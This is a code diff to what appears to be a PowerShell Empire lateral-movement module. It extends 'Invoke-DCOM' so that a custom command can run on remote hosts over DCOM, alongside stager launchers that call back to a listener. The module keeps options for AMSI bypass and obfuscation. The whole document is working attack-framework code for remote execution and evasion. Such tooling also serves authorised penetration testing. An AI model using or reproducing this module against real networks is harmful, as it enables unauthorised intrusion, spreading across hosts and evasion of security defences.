@@ -15,7 +15,7 @@ class Module(object):
 
             'Author': ['@rvrsh3ll'],
 
-            'Description': ('Executes a stager on remote hosts using DCOM.'),
+            'Description': ('Execute a stager or command on remote hosts using DCOM.'),
 
             'Software': '',
 
@@ -24,7 +24,7 @@ class Module(object):
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
@@ -32,7 +32,7 @@ class Module(object):
             'Language' : 'powershell',
 
             'MinLanguageVersion' : '2',
-            
+
             'Comments': []
         }
 
@@ -48,7 +48,7 @@ class Module(object):
             'CredID' : {
                 'Description'   :   'CredID from the store to use.',
                 'Required'      :   False,
-                'Value'         :   ''                
+                'Value'         :   ''
             },
             'ComputerName' : {
                 'Description'   :   'Host[s] to execute the stager on, comma separated.',
@@ -62,7 +62,12 @@ class Module(object):
             },
             'Listener' : {
                 'Description'   :   'Listener to use.',
-                'Required'      :   True,
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'Command' : {
+                'Description'   :   'Custom command to run.',
+                'Required'      :   False,
                 'Value'         :   ''
             },
             'Obfuscate': {
@@ -121,6 +126,7 @@ class Module(object):
         AMSIBypass2 = False
 
         listenerName = self.options['Listener']['Value']
+        command = self.options['Command']['Value']
         method = self.options['Method']['Value']
         computerName = self.options['ComputerName']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -133,6 +139,14 @@ class Module(object):
             AMSIBypass = True
         if (self.options['AMSIBypass2']['Value']).lower() == 'true':
             AMSIBypass2 = True
+
+        # Only "Command" or "Listener" but not both
+        if (listenerName == "" and command  == ""):
+          print(helpers.color("[!] Listener or Command required"))
+          return ""
+        if (listenerName and command):
+          print(helpers.color("[!] Cannot use Listener and Command at the same time"))
+          return ""
 
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-DCOM.ps1"
         if obfuscate:
@@ -148,13 +162,14 @@ class Module(object):
         f.close()
 
         script = moduleCode
+        scriptEnd = ""
 
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        if not self.mainMenu.listeners.is_listener_valid(listenerName) and not command:
             # not a valid listener, return nothing for the script
             print(helpers.color("[!] Invalid listener: " + listenerName))
             return ""
 
-        else:
+        elif listenerName:
 
             # generate the PowerShell one-liner with all of the proper options set
             launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
@@ -168,11 +183,14 @@ class Module(object):
                 return ""
             else:
 
-                stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-                scriptEnd = "Invoke-DCOM -ComputerName %s -Method %s -Command '%s'" % (computerName, method, stagerCmd)
+                Cmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
 
+        else:
+            Cmd = '%COMSPEC% /C start /b ' + command.replace('"','\\"')
+            print(helpers.color("[*] Running command:  " + Cmd))
 
-        scriptEnd += "| Out-String | %{$_ + \"`n\"};"
+        scriptEnd = "Invoke-DCOM -ComputerName %s -Method %s -Command '%s'" % (computerName, method, Cmd)
+
 
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
